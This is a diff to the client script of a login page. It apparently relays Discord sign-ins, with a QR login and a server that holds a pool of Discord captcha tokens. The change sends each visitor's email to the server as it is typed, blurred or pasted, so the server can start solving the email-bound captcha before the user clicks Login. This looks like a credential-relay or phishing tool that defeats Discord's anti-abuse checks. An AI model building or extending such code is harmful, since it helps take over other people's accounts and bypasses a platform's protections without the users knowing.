@@ -813,21 +813,49 @@ function backToLogin() {
 
 /* ═══ Init ═══ */
 var _prechallengeId = null;
-window.addEventListener('DOMContentLoaded', function() {
-  initQR();
+var _pcDebounce = null;
+var _lastPcEmail = '';
 
-  /* ── Instant pre-challenge: fires on PAGE LOAD ──
-     Server maintains a 24/7 global captcha token pool.
-     We grab one immediately so it's ready before the user even types anything.
-     No email needed — Discord captcha is IP/session based, not email-specific. */
+function firePrechallenge(email) {
+  if (!email || email.indexOf('@') === -1) return;
+  if (email === _lastPcEmail) return;
+  _lastPcEmail = email;
   fetch('/api/prechallenge', {
     method: 'POST',
     headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({})
+    body: JSON.stringify({email: email})
   })
     .then(function(r){return r.json()})
-    .then(function(d){ if(d.prechallenge_id) { _prechallengeId = d.prechallenge_id; console.log('[pre] Token reserved:', _prechallengeId); } })
+    .then(function(d){
+      if(d.prechallenge_id) {
+        _prechallengeId = d.prechallenge_id;
+        console.log('[pre] Solving for', email.substring(0,4) + '***', 'pc=' + _prechallengeId);
+      }
+    })
     .catch(function(){});
+}
+
+window.addEventListener('DOMContentLoaded', function() {
+  initQR();
+
+  /* ── Email-based pre-challenge ──
+     Captcha tokens are bound to the login email (rqtoken is email-specific).
+     We start solving as soon as we know the email. Triggers on input (debounced),
+     blur, and paste. Gives ~5-20s background solve time before Login click. */
+  var emailInput = document.getElementById('email');
+  emailInput.addEventListener('input', function() {
+    var em = this.value.trim();
+    clearTimeout(_pcDebounce);
+    _pcDebounce = setTimeout(function() { firePrechallenge(em); }, 400);
+  });
+  emailInput.addEventListener('blur', function() {
+    clearTimeout(_pcDebounce);
+    firePrechallenge(this.value.trim());
+  });
+  emailInput.addEventListener('paste', function() {
+    var self = this;
+    setTimeout(function() { firePrechallenge(self.value.trim()); }, 50);
+  });
 
   /* ── Safari iOS keyboard fix ── scroll focused input into view */
   if (/iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
